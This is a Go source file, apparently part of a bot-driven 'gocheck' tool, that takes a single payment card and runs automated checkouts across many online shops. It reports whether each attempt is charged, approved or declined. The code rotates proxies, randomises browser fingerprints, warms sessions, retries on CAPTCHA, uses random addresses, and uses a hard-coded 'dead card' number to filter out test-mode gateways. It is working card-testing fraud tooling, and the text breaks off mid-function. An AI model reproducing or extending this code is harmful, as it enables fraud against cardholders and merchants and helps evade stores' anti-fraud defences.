package main

// single.go — JSON single-card mode for bot integration.
//
// Usage:  gocheck -single < request.json
//
// Reads a JSON object from stdin, processes ONE card across MULTIPLE sites
// (picking randomly, with early termination on card-level results),
// and prints a JSON result to stdout.
// All log/debug output goes to stderr so stdout stays clean JSON.

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"math/rand/v2"
	"os"
	"strings"
	"sync"
	"time"
)

// ─── Request / Response types ────────────────────────────────────────────────

type CachedProduct struct {
	VariantID string `json:"variant_id"`
	ProductID string `json:"product_id"`
	Price     string `json:"price"`
	Title     string `json:"title"`
}

type SingleRequest struct {
	Card    string   `json:"card"`              // "num|mm|yyyy|cvv"
	Sites   []string `json:"sites"`             // list of site URLs
	Site    string   `json:"site,omitempty"`    // DEPRECATED: single site (backward compat)
	Proxy   string   `json:"proxy"`             // "http://user:pass@ip:port" or ""
	Proxies []string `json:"proxies,omitempty"` // multiple proxies for CAPTCHA proxy rotation

	// Product cache: map of shopURL -> cached product for multiple sites
	ProductCache map[string]CachedProduct `json:"product_cache,omitempty"`

	// DEPRECATED single-site cached product (backward compat)
	CachedVariantID string `json:"cached_variant_id,omitempty"`
	CachedProductID string `json:"cached_product_id,omitempty"`
	CachedPrice     string `json:"cached_price,omitempty"`
	CachedTitle     string `json:"cached_title,omitempty"`

	// Optional addresses file path
	AddressesFile string `json:"addresses_file,omitempty"`

	// Known test/bogus gateway sites to skip (hostnames from test_sites.txt)
	TestSitesBlacklist []string `json:"test_sites,omitempty"`
}

type SingleResponse struct {
	Status    string `json:"status"`     // charged, declined, approved, cvv, unknown, error, site_error, captcha
	Code      string `json:"code"`       // raw code e.g. SUCCESS, CARD_DECLINED, CAPTCHA_REQUIRED
	Amount    string `json:"amount"`     // "$12.99"
	SiteLabel string `json:"site_label"` // "shopname"
	ShopURL   string `json:"shop_url"`

	// Product info (so Python can cache it)
	ProductFound bool   `json:"product_found"`
	VariantID    string `json:"variant_id,omitempty"`
	ProductID    string `json:"product_id,omitempty"`
	ProductPrice string `json:"product_price,omitempty"`
	ProductTitle string `json:"product_title,omitempty"`

	ReceiptID string  `json:"receipt_id,omitempty"`
	Gateway   string  `json:"gateway,omitempty"` // payment gateway from checkout proposal API
	Elapsed   float64 `json:"elapsed"`
	Error     string  `json:"error,omitempty"`
	ErrorType string  `json:"error_type,omitempty"` // proxy, site, card, unknown, site_dead, site_ratelimit, rate_limit

	// Per-site failure details for debugging ALL_SITES_EXHAUSTED
	FailureDetails []string `json:"failure_details,omitempty"`

	// Sites that should be permanently removed (session token missing, no shipping, site_error codes)
	DeadSites []string `json:"dead_sites,omitempty"`
	// Sites detected as test/bogus gateways (also in DeadSites, but flagged separately for Python Layer 3)
	TestSites []string `json:"test_sites,omitempty"`
	// Temporarily failed sites (CAPTCHA after proxy retries, transient errors) — NOT removed from file
	TempDeadSites []string `json:"temp_dead_sites,omitempty"`
	// Per-site skip/error reason so Python can track strikes
	SiteSkipReasons map[string]string `json:"site_skip_reasons,omitempty"`
	// Sites that specifically returned CAPTCHA
	CaptchaSites []string `json:"captcha_sites,omitempty"`

	// All product discoveries so Python can update its cache
	DiscoveredProducts map[string]CachedProduct `json:"discovered_products,omitempty"`
}

// ─── Entry point ─────────────────────────────────────────────────────────────

func runSingleMode() {
	// Redirect all fmt.Print* to stderr so stdout is clean JSON
	oldStdout := os.Stdout
	os.Stdout = os.Stderr

	data, err := io.ReadAll(os.Stdin)
	if err != nil {
		writeResult(oldStdout, SingleResponse{
			Status: "error", Code: "STDIN_ERROR", Error: err.Error(), ErrorType: "unknown",
		})
		return
	}

	var req SingleRequest
	if err := json.Unmarshal(data, &req); err != nil {
		writeResult(oldStdout, SingleResponse{
			Status: "error", Code: "JSON_PARSE_ERROR", Error: err.Error(), ErrorType: "unknown",
		})
		return
	}

	// Build site list: support both "sites" array and legacy "site" field
	sites := req.Sites
	if len(sites) == 0 && req.Site != "" {
		sites = []string{req.Site}
	}

	if req.Card == "" || len(sites) == 0 {
		writeResult(oldStdout, SingleResponse{
			Status: "error", Code: "MISSING_FIELDS", Error: "card and sites are required", ErrorType: "unknown",
		})
		return
	}

	// Merge legacy single-site cache into product cache map
	if req.ProductCache == nil {
		req.ProductCache = make(map[string]CachedProduct)
	}
	if req.CachedVariantID != "" && req.Site != "" {
		shopURL := normalizeShopURL(req.Site)
		if _, ok := req.ProductCache[shopURL]; !ok {
			req.ProductCache[shopURL] = CachedProduct{
				VariantID: req.CachedVariantID,
				ProductID: req.CachedProductID,
				Price:     req.CachedPrice,
				Title:     req.CachedTitle,
			}
		}
	}

	// Suppress batch-mode log noise
	cfg.SummaryOnly = true
	cfg.SiteRemoval = false

	result := processSingleMultiSite(req.Card, sites, req.Proxy, req.Proxies, req.AddressesFile, req.ProductCache, req.TestSitesBlacklist)

	// Restore stdout and write
	os.Stdout = oldStdout
	writeResult(oldStdout, result)
}

func writeResult(w *os.File, resp SingleResponse) {
	enc := json.NewEncoder(w)
	enc.SetEscapeHTML(false)
	enc.Encode(resp) //nolint:errcheck
}

// verifyGatewayResult is the outcome of dead-card gateway verification.
type verifyGatewayResult string

const (
	gatewayVerifiedReal         verifyGatewayResult = "real"
	gatewayVerifiedFake         verifyGatewayResult = "fake"
	gatewayVerifyInconclusive   verifyGatewayResult = "inconclusive"
)

type checkoutOutcome struct {
	resp      SingleResponse
	terminal  bool
	captcha   bool
	siteError bool
	failInfo  string
}

// verifySiteIsReal runs a dead-card checkout on the same site. If the dead card
// also gets charged, the gateway is fake. Returns inconclusive when verification
// cannot complete (never treat that as a real charge).
func verifySiteIsReal(shopURL, siteLabel, variantID, proxyURL, storefrontToken, gqlShopURL string, addresses []Address) verifyGatewayResult {
	deadCard, ok := parseCCLine(verifyCardLine)
	if !ok {
		fmt.Fprintf(os.Stderr, "[VERIFY] Failed to parse dead card — inconclusive\n")
		return gatewayVerifyInconclusive
	}

	fp := randomFingerprint()
	client := newClient(fp, proxyURL, 12*time.Second)

	cs := &CheckoutSession{
		Client:           client,
		ProxyURL:         proxyURL,
		ShopURL:          shopURL,
		VariantID:        variantID,
		StorefrontToken:  storefrontToken,
		GqlShopURL:       gqlShopURL,
		Card:             deadCard,
		Addr:             randomAddress(addresses),
		FP:               fp,
		ShippingRequired: true,
	}

	fmt.Fprintf(os.Stderr, "[VERIFY] [%s] Running dead-card verification checkout...\n", siteLabel)

	if err := cs.Step1AddToCart(); err != nil {
		fmt.Fprintf(os.Stderr, "[VERIFY] [%s] Step1 failed: %s — inconclusive\n", siteLabel, err.Error())
		return gatewayVerifyInconclusive
	}

	if err := cs.Step2TokenizeCard(); err != nil {
		fmt.Fprintf(os.Stderr, "[VERIFY] [%s] Step2 failed: %s — inconclusive\n", siteLabel, err.Error())
		return gatewayVerifyInconclusive
	}

	if err := cs.Step3Proposal(); err != nil {
		fmt.Fprintf(os.Stderr, "[VERIFY] [%s] Step3 failed: %s — inconclusive\n", siteLabel, err.Error())
		return gatewayVerifyInconclusive
	}

	submitResult := cs.Step4Submit()
	if submitResult.ReceiptID == "" {
		code := submitResult.Code
		if code == "" {
			code = "UNKNOWN"
		}
		fmt.Fprintf(os.Stderr, "[VERIFY] [%s] Step4 no receipt (code=%s) — site is REAL\n", siteLabel, code)
		return gatewayVerifiedReal
	}

	if !strings.HasPrefix(submitResult.ReceiptID, "gid://shopify/") {
		fmt.Fprintf(os.Stderr, "[VERIFY] [%s] Step4 non-standard receipt — inconclusive\n", siteLabel)
		return gatewayVerifyInconclusive
	}

	success, pollCode, pollResponse := cs.Step5PollReceipt(submitResult.ReceiptID)
	code := pollCode
	if pollResponse != nil {
		code = extractReceiptCode(pollResponse)
	}

	if success || strings.ToUpper(code) == "SUCCESS" {
		fmt.Fprintf(os.Stderr, "[VERIFY] [%s] *** DEAD CARD CHARGED — SITE IS FAKE ***\n", siteLabel)
		return gatewayVerifiedFake
	}

	fmt.Fprintf(os.Stderr, "[VERIFY] [%s] Dead card declined (%s) — site is REAL\n", siteLabel, code)
	return gatewayVerifiedReal
}

const verifyCardLine = "4100390489958229|12|2028|013"

func verifySiteApproval(shopURL, siteLabel, variantID, proxyURL, storefrontToken, gqlShopURL string, addresses []Address) verifyGatewayResult {
	deadCard, ok := parseCCLine(verifyCardLine)
	if !ok {
		fmt.Fprintf(os.Stderr, "[VERIFY-APPR] Failed to parse dead card — inconclusive\n")
		return gatewayVerifyInconclusive
	}

	fp := randomFingerprint()
	client := newClient(fp, proxyURL, 12*time.Second)

	cs := &CheckoutSession{
		Client:           client,
		ProxyURL:         proxyURL,
		ShopURL:          shopURL,
		VariantID:        variantID,
		StorefrontToken:  storefrontToken,
		GqlShopURL:       gqlShopURL,
		Card:             deadCard,
		Addr:             randomAddress(addresses),
		FP:               fp,
		ShippingRequired: true,
	}

	fmt.Fprintf(os.Stderr, "[VERIFY-APPR] [%s] Running dead-card approval verification...\n", siteLabel)

	if err := cs.Step1AddToCart(); err != nil {
		fmt.Fprintf(os.Stderr, "[VERIFY-APPR] [%s] Step1 failed: %s — inconclusive\n", siteLabel, err.Error())
		return gatewayVerifyInconclusive
	}

	if err := cs.Step2TokenizeCard(); err != nil {
		fmt.Fprintf(os.Stderr, "[VERIFY-APPR] [%s] Step2 failed: %s — inconclusive\n", siteLabel, err.Error())
		return gatewayVerifyInconclusive
	}

	if err := cs.Step3Proposal(); err != nil {
		fmt.Fprintf(os.Stderr, "[VERIFY-APPR] [%s] Step3 failed: %s — inconclusive\n", siteLabel, err.Error())
		return gatewayVerifyInconclusive
	}

	submitResult := cs.Step4Submit()
	var finalCode string

	if submitResult.ReceiptID == "" {
		finalCode = submitResult.Code
	} else if !strings.HasPrefix(submitResult.ReceiptID, "gid://shopify/") {
		fmt.Fprintf(os.Stderr, "[VERIFY-APPR] [%s] Step4 non-standard receipt — inconclusive\n", siteLabel)
		return gatewayVerifyInconclusive
	} else {
		_, pollCode, pollResponse := cs.Step5PollReceipt(submitResult.ReceiptID)
		finalCode = pollCode
		if pollResponse != nil {
			finalCode = extractReceiptCode(pollResponse)
		}
	}

	if finalCode == "" {
		finalCode = "UNKNOWN"
	}

	deadStatus := classifySingleCode(finalCode)

	if deadStatus == "approved" {
		fmt.Fprintf(os.Stderr, "[VERIFY-APPR] [%s] *** DEAD CARD ALSO APPROVED (%s) — SITE GIVES FAKE APPROVALS ***\n", siteLabel, finalCode)
		return gatewayVerifiedFake
	}

	fmt.Fprintf(os.Stderr, "[VERIFY-APPR] [%s] Dead card got '%s' (%s) — site approvals are TRUSTWORTHY\n", siteLabel, deadStatus, finalCode)
	return gatewayVerifiedReal
}

func handleGatewayVerification(
	shopURL, siteLabel string,
	product Product,
	proxyURL string,
	addresses []Address,
	charged bool,
) verifyGatewayResult {
	if charged {
		return verifySiteIsReal(shopURL, siteLabel, product.VariantID, proxyURL, product.StorefrontToken, product.GqlShopURL, addresses)
	}
	return verifySiteApproval(shopURL, siteLabel, product.VariantID, proxyURL, product.StorefrontToken, product.GqlShopURL, addresses)
}

type gatewayVerifyAction struct {
	proceed  bool
	terminal *checkoutOutcome
	failInfo string
}

func evaluateGatewayVerification(
	result verifyGatewayResult,
	kind, shopURL, siteLabel, step string,
	singleSite bool,
	makeResp func(status, code string) SingleResponse,
	deadMu *sync.Mutex,
	allPermDeadSites, allTestSites *[]string,
) gatewayVerifyAction {
	switch result {
	case gatewayVerifiedReal:
		if kind == "charge" {
			fmt.Fprintf(os.Stderr, "[P2] [%s] Site verified REAL — dead card was declined\n", siteLabel)
		} else {
			fmt.Fprintf(os.Stderr, "[P2] [%s] Approval verified REAL — dead card was declined\n", siteLabel)
		}
		return gatewayVerifyAction{proceed: true}
	case gatewayVerifiedFake:
		code := "FAKE_GATEWAY_DETECTED"
		failTag := "FAKE_GATEWAY"
		if kind == "approval" {
			code = "FAKE_APPROVAL_DETECTED"
			failTag = "FAKE_APPROVAL"
			fmt.Fprintf(os.Stderr, "[P2] [%s] *** FAKE APPROVAL *** dead-card also approved — blacklisting site\n", siteLabel)
		} else {
			fmt.Fprintf(os.Stderr, "[P2] [%s] *** FAKE GATEWAY *** dead-card also charged — blacklisting site\n", siteLabel)
		}
		deadMu.Lock()
		*allPermDeadSites = append(*allPermDeadSites, shopURL)
		*allTestSites = append(*allTestSites, shopURL)
		deadMu.Unlock()
		failInfo := fmt.Sprintf("%s:%s:%s", siteLabel, step, failTag)
		if singleSite {
			return gatewayVerifyAction{
				terminal: &checkoutOutcome{
					resp:     makeResp("error", code),
					terminal: true,
					failInfo: failInfo,
				},
				failInfo: failInfo,
			}
		}
		return gatewayVerifyAction{failInfo: failInfo}
	default:
		fmt.Fprintf(os.Stderr, "[P2] [%s] Gateway verification inconclusive — not reporting %s\n", siteLabel, kind)
		failInfo := fmt.Sprintf("%s:%s:CHARGE_UNVERIFIED", siteLabel, step)
		if singleSite {
			return gatewayVerifyAction{
				terminal: &checkoutOutcome{
					resp:     makeResp("error", "CHARGE_UNVERIFIED"),
					terminal: true,
					failInfo: failInfo,
				},
				failInfo: failInfo,
			}
		}
		return gatewayVerifyAction{failInfo: failInfo}
	}
}

// ─── Core multi-site single-card processor ───────────────────────────────────
//
// TWO-PHASE architecture for maximum hit rate with minimal wasted work:
//
// PHASE 1 — Product Discovery (all sites, parallel)
//   Launch a goroutine per site that ONLY does product detection (1-2 GETs).
//   Cached products resolve instantly (zero HTTP). Collect sites with products.
//   Stop early once we have enough (5) or after 12s timeout.
//
// PHASE 2 — Checkout (only verified sites, parallel)
//   Take up to 5 sites that passed Phase 1 and run full checkout (Steps 1-5)
//   in parallel. First card-level result wins, cancel rest.
//
// Why this is dramatically better:
//   - ~97% of sites are dead/empty. Old approach: 8 sites × full checkout = all waste.
//   - New approach: 40 cheap probes → find the ~3% that work → checkout only those.
//   - Phase 1: 40 GETs in parallel ≈ 5-10s.  Phase 2: 5 checkouts in parallel ≈ 8-12s.
//   - Total: ~15-20s with ~95%+ success rate instead of ~20% success rate.

func processSingleMultiSite(cardLine string, sites []string, proxyStr string, proxies []string, addressesFile string, productCacheIn map[string]CachedProduct, testSitesBlacklist []string) SingleResponse {
	start := time.Now()

	// Parse card
	card, ok := parseCCLine(cardLine)
	if !ok {
		return SingleResponse{
			Status: "error", Code: "INVALID_CARD", Error: "could not parse card line",
			ErrorType: "card", Elapsed: elapsed(start),
		}
	}

	// Reject known test/bogus card numbers immediately
	if card.IsTestCard() {
		fmt.Fprintf(os.Stderr, "[TEST-CARD] %s is a known test PAN — auto-declining\n", card.Masked())
		return SingleResponse{
			Status: "declined", Code: "TEST_CARD_REJECTED",
			Error: "known test/bogus card number", ErrorType: "card",
			Elapsed: elapsed(start),
		}
	}

	// Proxy pool for rotation (CAPTCHA retry uses different proxy)
	var proxyPool []string
	for _, p := range proxies {
		np := normalizeProxy(p)
		if np != "" {
			proxyPool = append(proxyPool, np)
		}
	}
	if len(proxyPool) == 0 && proxyStr != "" {
		proxyPool = []string{normalizeProxy(proxyStr)}
	}
	proxyURL := ""
	if len(proxyPool) > 0 {
		proxyURL = proxyPool[0]
	}

	// Load addresses ONCE (shared across all goroutines — read-only)
	var addresses []Address
	if addressesFile != "" {
		addresses = loadAddresses(addressesFile)
	}

	// ── Layer 1: Filter out known test/bogus gateway sites ──
	testBlacklist := make(map[string]bool, len(testSitesBlacklist))
	for _, ts := range testSitesBlacklist {
		host := strings.ToLower(strings.TrimSpace(ts))
		host = strings.TrimPrefix(host, "https://")
		host = strings.TrimPrefix(host, "http://")
		host = strings.Split(host, "/")[0]
		host = strings.Split(host, "?")[0]
		if host != "" {
			testBlacklist[host] = true
		}
	}
	if len(testBlacklist) > 0 {
		filtered := sites[:0:0]
		skipped := 0
		for _, s := range sites {
			norm := normalizeShopURL(s)
			host := strings.TrimPrefix(norm, "https://")
			host = strings.TrimPrefix(host, "http://")
			host = strings.Split(host, "/")[0]
			if testBlacklist[strings.ToLower(host)] {
				skipped++
				continue
			}
			filtered = append(filtered, s)
		}
		if skipped > 0 {
			fmt.Fprintf(os.Stderr, "[SINGLE] Layer 1: Skipped %d known test/bogus sites\n", skipped)
		}
		sites = filtered
	}

	// Shuffle all sites for fair distribution
	shuffled := make([]string, len(sites))
	copy(shuffled, sites)
	for i := len(shuffled) - 1; i > 0; i-- {
		j := rand.IntN(i + 1)
		shuffled[i], shuffled[j] = shuffled[j], shuffled[i]
	}

	singleSite := len(sites) == 1
	probeSec := 12
	checkoutSec := 45
	maxCheckoutSlots := 15
	if singleSite {
		probeSec = cfg.SingleSiteProbeSec
		checkoutSec = cfg.SingleSiteCheckoutSec
		maxCheckoutSlots = 1
		logDebug("FAST", "single-site mode: probe=%ds checkout=%ds", probeSec, checkoutSec)
	}

	// ══════════════════════════════════════════════════════════════════
	//  PHASE 1 — Product Discovery (all sites, parallel, cheap)
	// ══════════════════════════════════════════════════════════════════

	type probeResult struct {
		shopURL   string
		siteLabel string
		product   *Product
		deadSite  string // non-empty if site is dead (404/429/timeout)
		permDead  bool   // true for 404 (permanent), false for 429/500/timeout (temporary)
		probeFail string // rate_limited | no_products
	}

	type viableSite struct {
		shopURL   string
		siteLabel string
		product   *Product
	}

	probeCh := make(chan probeResult, len(shuffled))
	probeCtx, probeCancel := context.WithTimeout(context.Background(), time.Duration(probeSec)*time.Second)

	var deadMu sync.Mutex
	var allPermDeadSites []string
	var allTempDeadSites []string
	var allCaptchaSites []string
	var allTestSites []string
	allSiteSkipReasons := make(map[string]string)
	allDiscovered := make(map[string]CachedProduct)
	var discoveredMu sync.Mutex
	var lastProbeFail string

	fmt.Fprintf(os.Stderr, "[SINGLE] Phase 1: Probing %d sites for products (%d proxies)\n", len(shuffled), len(proxyPool))

	for idx, site := range shuffled {
		go func(siteURL string, probeIdx int) {
			shopURL := normalizeShopURL(siteURL)
			siteLabel := formatSiteLabel(shopURL)

			if probeCtx.Err() != nil {
				probeCh <- probeResult{shopURL: shopURL, siteLabel: siteLabel}
				return
			}

			// ── Cached product → instant success (ZERO HTTP) ──
			if cached, ok2 := productCacheIn[shopURL]; ok2 && cached.VariantID != "" {
				p := &Product{
					ID: cached.ProductID, VariantID: cached.VariantID,
					PriceStr: cached.Price, Title: cached.Title,
				}
				p.Price = parsePrice(p.PriceStr)
				// Skip cached products over the price limit
				if cfg.MaxPrice > 0 && p.Price > cfg.MaxPrice {
					fmt.Fprintf(os.Stderr, "[P1] [%s] Cached product $%s exceeds $%.0f limit — skipping\n", siteLabel, p.PriceStr, cfg.MaxPrice)
					probeCh <- probeResult{shopURL: shopURL, siteLabel: siteLabel}
					return
				}
				fmt.Fprintf(os.Stderr, "[P1] [%s] Cached product: %s\n", siteLabel, p.Title)
				probeCh <- probeResult{shopURL: shopURL, siteLabel: siteLabel, product: p}
				return
			}

			// ── HTTP probe: Storefront GraphQL only ──
			// Distribute probes across ALL proxies (round-robin) to avoid single-proxy rate limiting
			probeProxy := proxyURL
			if len(proxyPool) > 0 {
				probeProxy = proxyPool[probeIdx%len(proxyPool)]
			}
			fp := randomFingerprint()
			probeTimeout := 8 * time.Second
			client := newClient(fp, probeProxy, probeTimeout)
			p, probeFail := autoDetectProductResult(client, shopURL, fp, probeProxy)

			if p != nil {
				fmt.Fprintf(os.Stderr, "[P1] [%s] Found: %s $%s\n", siteLabel, p.Title, p.PriceStr)
				probeCh <- probeResult{shopURL: shopURL, siteLabel: siteLabel, product: p}
				return
			}

			probeCh <- probeResult{shopURL: shopURL, siteLabel: siteLabel, probeFail: probeFail}
		}(site, idx)
	}

	// Collect Phase 1 results
	var viable []viableSite
	probesReceived := 0

	for probesReceived < len(shuffled) {
		select {
		case r := <-probeCh:
			probesReceived++

			// Track dead sites — permanent vs temporary
			if r.deadSite != "" {
				deadMu.Lock()
				if r.permDead {
					allPermDeadSites = append(allPermDeadSites, r.deadSite)
				} else {
					allTempDeadSites = append(allTempDeadSites, r.deadSite)
				}
				deadMu.Unlock()
			}

			if r.probeFail != "" {
				lastProbeFail = r.probeFail
			}

			// Track discovered products
			if r.product != nil {
				discoveredMu.Lock()
				allDiscovered[r.shopURL] = CachedProduct{
					VariantID: r.product.VariantID, ProductID: r.product.ID,
					Price: r.product.PriceStr, Title: r.product.Title,
				}
				discoveredMu.Unlock()

				if len(viable) < maxCheckoutSlots {
					viable = append(viable, viableSite{r.shopURL, r.siteLabel, r.product})
					fmt.Fprintf(os.Stderr, "[P1] Product #%d/%d: %s\n",
						len(viable), maxCheckoutSlots, r.siteLabel)
				}
				if len(viable) >= maxCheckoutSlots {
					probeCancel() // got enough — stop wasting time
				}
			}

		case <-probeCtx.Done():
			goto startPhase2
		}
	}

startPhase2:
	probeCancel()

	phase1Time := elapsed(start)
	fmt.Fprintf(os.Stderr, "[SINGLE] Phase 1 done: %d products from %d probes in %.1fs\n",
		len(viable), probesReceived, phase1Time)

	if len(viable) == 0 {
		// ══ Phase 1b — Desperate fallback: retry with NO price limit ══
		// Instead of immediately returning ALL_SITES_EXHAUSTED, try a
		// synchronous probe of up to 10 random sites with relaxed MaxPrice.
		// This catches stores where cheapest product > MaxPrice.
		fallbackCount := min(10, len(shuffled))
		if singleSite {
			fallbackCount = 1
		}
		fmt.Fprintf(os.Stderr, "[SINGLE] Phase 1b: 0 viable → retrying %d sites with MaxPrice=$%.0f\n", fallbackCount, cfg.MaxPriceFallback)

		origMaxPrice := cfg.MaxPrice
		cfg.MaxPrice = cfg.MaxPriceFallback

		for i := 0; i < fallbackCount; i++ {
			siteURL := shuffled[i]
			shopURL := normalizeShopURL(siteURL)
			siteLabel := formatSiteLabel(shopURL)

			// Check product cache with relaxed price
			if cached, ok := productCacheIn[shopURL]; ok && cached.VariantID != "" {
				p := &Product{
					ID: cached.ProductID, VariantID: cached.VariantID,
					PriceStr: cached.Price, Title: cached.Title,
				}
				p.Price = parsePrice(p.PriceStr)
				if cfg.MaxPrice <= 0 || p.Price <= cfg.MaxPrice {
					fmt.Fprintf(os.Stderr, "[P1b] [%s] Cached product (relaxed): %s $%s\n", siteLabel, p.Title, p.PriceStr)
					viable = append(viable, viableSite{shopURL, siteLabel, p})
					allDiscovered[shopURL] = CachedProduct{VariantID: p.VariantID, ProductID: p.ID, Price: p.PriceStr, Title: p.Title}
					if len(viable) >= 5 {
						break
					}
					continue
				}
			}

			// HTTP probe with relaxed price
			probeProxy := proxyURL
			if len(proxyPool) > 0 {
				probeProxy = proxyPool[i%len(proxyPool)]
			}
			fp := randomFingerprint()
			probeTimeout := 8 * time.Second
			client := newClient(fp, probeProxy, probeTimeout)
			p, probeFail := autoDetectProductResult(client, shopURL, fp, probeProxy)
			if probeFail != "" {
				lastProbeFail = probeFail
			}
			if p != nil {
				fmt.Fprintf(os.Stderr, "[P1b] [%s] Found (relaxed): %s $%s\n", siteLabel, p.Title, p.PriceStr)
				viable = append(viable, viableSite{shopURL, siteLabel, p})
				allDiscovered[shopURL] = CachedProduct{VariantID: p.VariantID, ProductID: p.ID, Price: p.PriceStr, Title: p.Title}
				if len(viable) >= 5 {
					break
				}
			}
		}

		cfg.MaxPrice = origMaxPrice
		fmt.Fprintf(os.Stderr, "[SINGLE] Phase 1b done: %d viable found\n", len(viable))
	}

	if len(viable) == 0 {
		code := "NO_PRODUCT_FOUND"
		errType := "no_product"
		if lastProbeFail == "rate_limited" {
			code = "HTTP_429"
			errType = "rate_limit"
		}
		return SingleResponse{
			Status:             "error",
			Code:               code,
			Error:              code,
			ErrorType:          errType,
			Elapsed:            elapsed(start),
			DeadSites:          dedup(allPermDeadSites),
			TestSites:          dedup(allTestSites),
			TempDeadSites:      dedup(allTempDeadSites),
			SiteSkipReasons:    allSiteSkipReasons,
			CaptchaSites:       dedup(allCaptchaSites),
			DiscoveredProducts: allDiscovered,
		}
	}

	// ══════════════════════════════════════════════════════════════════
	//  PHASE 2 — Worker-pool checkout (auto-retry on site failures)
	//
	//  Workers pull sites from a shared queue. If checkout fails at
	//  Step 1/2/3 (site-level), the worker marks it dead and pulls
	//  the NEXT site from the queue automatically. First card-level
	//  result (Step 4/5) wins and cancels everything.
	// ══════════════════════════════════════════════════════════════════

	maxViable := 30
	if len(viable) > maxViable {
		viable = viable[:maxViable]
	}

	numWorkers := min(8, len(viable))
	singleSiteCheckout := len(viable) == 1
	fmt.Fprintf(os.Stderr, "[SINGLE] Phase 2: %d workers, %d sites queued\n",
		numWorkers, len(viable))

	viableQueue := make(chan viableSite, len(viable))
	for _, vs := range viable {
		viableQueue <- vs
	}
	close(viableQueue)

	checkoutCh := make(chan checkoutOutcome, len(viable))
	checkoutCtx, checkoutCancel := context.WithTimeout(context.Background(), time.Duration(checkoutSec)*time.Second)
	defer checkoutCancel()

	var wg sync.WaitGroup
	wg.Add(numWorkers)

	for w := 0; w < numWorkers; w++ {
		go func(workerID int) {
			defer wg.Done()
			for vs := range viableQueue {
				if checkoutCtx.Err() != nil {
					return
				}
				shopURL, siteLabel, product := vs.shopURL, vs.siteLabel, vs.product

				// ── Proxy retry: CAPTCHA/403 → retry with different proxy ──
				maxPA := 2
				if cfg.SingleProxyAttempt || len(proxyPool) <= 1 {
					maxPA = 1
				} else if len(proxyPool) > 1 {
					maxPA = min(len(proxyPool), 2)
				}
				var lastFailInfo string
				sentResult := false

				for pa := 0; pa < maxPA; pa++ {
					if checkoutCtx.Err() != nil {
						return
					}
					currentProxy := proxyURL
					if len(proxyPool) > 0 {
						currentProxy = proxyPool[(workerID+pa)%len(proxyPool)]
					}
					if pa > 0 {
						fmt.Fprintf(os.Stderr, "[P2] [%s] Proxy retry #%d/%d\n", siteLabel, pa+1, maxPA)
					}

					fmt.Fprintf(os.Stderr, "[P2] [%s] Starting checkout ($%s)\n",
						siteLabel, product.PriceStr)

					fp := randomFingerprint()
					clientTimeout := 12 * time.Second
					if cfg.FastMode {
						clientTimeout = 10 * time.Second
					}
					client := newClient(fp, currentProxy, clientTimeout)

					cs := &CheckoutSession{
						Client:           client,
						ProxyURL:           currentProxy,
						ShopURL:            shopURL,
						VariantID:          product.VariantID,
						AltVariantIDs:      product.AltVariantIDs,
						StorefrontToken:    product.StorefrontToken,
						GqlShopURL:         product.GqlShopURL,
						Card:               card,
						Addr:               randomAddress(addresses),
						FP:                 fp,
						ShippingRequired:   true,
					}

					makeResp := func(status, code string) SingleResponse {
						amount := formatAmount(cs.ActualTotal)
						if amount == "" || amount == "$0" {
							amount = formatAmount(product.PriceStr)
						}
						return SingleResponse{
							Status: status, Code: code, Amount: amount,
							SiteLabel: siteLabel, ShopURL: shopURL, ProductFound: true,
							VariantID: product.VariantID, ProductID: product.ID,
							ProductPrice: product.PriceStr, ProductTitle: product.Title,
							Gateway: cs.PaymentGateway,
							Elapsed: elapsed(start),
						}
					}

					// ── Session warming: build realistic cookie profile ──
					cs.WarmStorefrontSession()

					// ── Step 1: Add to cart + create checkout ──
					if err := cs.Step1AddToCart(); err != nil {
						errStr := err.Error()
						fmt.Fprintf(os.Stderr, "[P2] [%s] Step1 FAIL: %s\n", siteLabel, errStr)
						// Step1 token failures = site broken (password-protected, no checkout, etc.) → permanent
						if (strings.Contains(errStr, "session token not found") ||
							strings.Contains(errStr, "no checkout token in URL")) &&
							!strings.Contains(errStr, "cartCreate failed") {
							deadMu.Lock()
							allPermDeadSites = append(allPermDeadSites, shopURL)
							deadMu.Unlock()
							lastFailInfo = fmt.Sprintf("%s:Step1:%s", siteLabel, truncErr(errStr))
							break // site broken → next site
						}
						// Test/bogus gateway detected → permanent dead + signal to Python
						if strings.Contains(errStr, "TEST_MODE_DETECTED") {
							fmt.Fprintf(os.Stderr, "[P2] [%s] TEST MODE — adding to dead sites\n", siteLabel)
							deadMu.Lock()
							allPermDeadSites = append(allPermDeadSites, shopURL)
							allTestSites = append(allTestSites, shopURL)
							deadMu.Unlock()
							lastFailInfo = fmt.Sprintf("%s:Step1:TEST_MODE", siteLabel)
							break // skip this site entirely
						}
						// Network/proxy errors (dial, timeout, tls, net/http, 429) → retry with different proxy
						isNetworkErr := strings.Contains(errStr, "dial") ||
							strings.Contains(errStr, "net/http") ||
							strings.Contains(errStr, "tls handshake") ||
							strings.Contains(errStr, "context deadline") ||
							strings.Contains(errStr, "connection refused") ||
							strings.Contains(errStr, "connection reset") ||
							strings.Contains(errStr, "i/o timeout") ||
							strings.Contains(errStr, "429")
						if isNetworkErr && pa < maxPA-1 {
							fmt.Fprintf(os.Stderr, "[P2] [%s] Step1 network error → retry with different proxy (%d/%d)\n", siteLabel, pa+1, maxPA)
							continue // proxy issue → retry with next proxy
						}
						lastFailInfo = fmt.Sprintf("%s:Step1:%s", siteLabel, truncErr(errStr))
						break // other error or last attempt → next site
					}
					if checkoutCtx.Err() != nil {
						checkoutCh <- checkoutOutcome{failInfo: fmt.Sprintf("%s:cancelled", siteLabel)}
						return
					}

					// ── Step 2: Tokenize card ──
					if err := cs.Step2TokenizeCard(); err != nil {
						errStr := err.Error()
						fmt.Fprintf(os.Stderr, "[P2] [%s] Step2 FAIL: %s\n", siteLabel, errStr)
						// Network/proxy errors → retry with different proxy
						isRetryable := strings.Contains(errStr, "403") ||
							strings.Contains(errStr, "dial") ||
							strings.Contains(errStr, "net/http") ||
							strings.Contains(errStr, "tls handshake") ||
							strings.Contains(errStr, "context deadline") ||
							strings.Contains(errStr, "connection refused") ||
							strings.Contains(errStr, "connection reset") ||
							strings.Contains(errStr, "i/o timeout") ||
							strings.Contains(errStr, "429")
						if isRetryable && pa < maxPA-1 {
							fmt.Fprintf(os.Stderr, "[P2] [%s] Step2 retryable error → retry with different proxy (%d/%d)\n", siteLabel, pa+1, maxPA)
							continue // proxy issue → retry
						}
						// 429 after all retries exhausted → mark site as temp_dead so Python cools it
						if strings.Contains(errStr, "429") {
							deadMu.Lock()
							allTempDeadSites = append(allTempDeadSites, shopURL)
